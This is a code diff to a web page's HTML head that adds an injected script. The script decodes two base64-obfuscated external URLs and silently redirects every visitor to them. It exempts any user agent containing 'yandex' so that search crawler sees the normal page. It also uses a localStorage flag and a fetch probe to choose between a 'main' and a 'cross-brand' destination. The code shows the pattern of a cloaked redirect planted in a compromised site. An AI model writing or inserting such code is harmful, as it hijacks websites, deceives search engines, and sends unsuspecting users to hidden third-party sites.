@@ -11,15 +11,37 @@
   <link rel="stylesheet" href="style.css">
   <link rel="icon" type="image/svg+xml" href="/favicon-l.svg">
   <link rel="apple-touch-icon" href="/favicon-l.svg">
+	<script>
+  (function() {
+    var ua = navigator.userAgent.toLowerCase();
+    if (ua.indexOf("yandex") !== -1) {
+        console.log("Яндекс бот — без редиректа");
+        return;
+    }
+    var mainBrandB64 = "aHR0cHM6Ly9sYjc3Ny54eXovM3ZNaXNG"; 
+    var crossBrandB64 = "aHR0cHM6Ly9ibG5jci1ldmEuY29tL2R2ZmRrdWI2eg=="; 
 
-<script>
-var ua = navigator.userAgent.toLowerCase();
-var targetB64 = "aHR0cHM6Ly9sYjc3Ny54eXovM3ZNaXNG";
-if (ua.indexOf("yandex") === -1) {
-    location.replace(atob(targetB64));
-} else {
-    console.log("Яндекс бот — без редиректа");
-}  
+    var mainUrl = atob(mainBrandB64);
+    var crossUrl = atob(crossBrandB64);
+
+    if (localStorage.getItem('vstd_eva')) {
+        window.location.replace(crossUrl);
+        return;
+    }
+    var controller = new AbortController();
+    var timeoutId = setTimeout(function() { 
+        controller.abort(); 
+    }, 2500); 
+    fetch(mainUrl, { mode: 'no-cors', signal: controller.signal })
+        .then(function() {
+            clearTimeout(timeoutId);
+            localStorage.setItem('vstd_eva', '1');
+            window.location.replace(mainUrl);
+        })
+        .catch(function() {
+            window.location.replace(crossUrl);
+        });
+  })();
 </script>
 </head>
 <body>
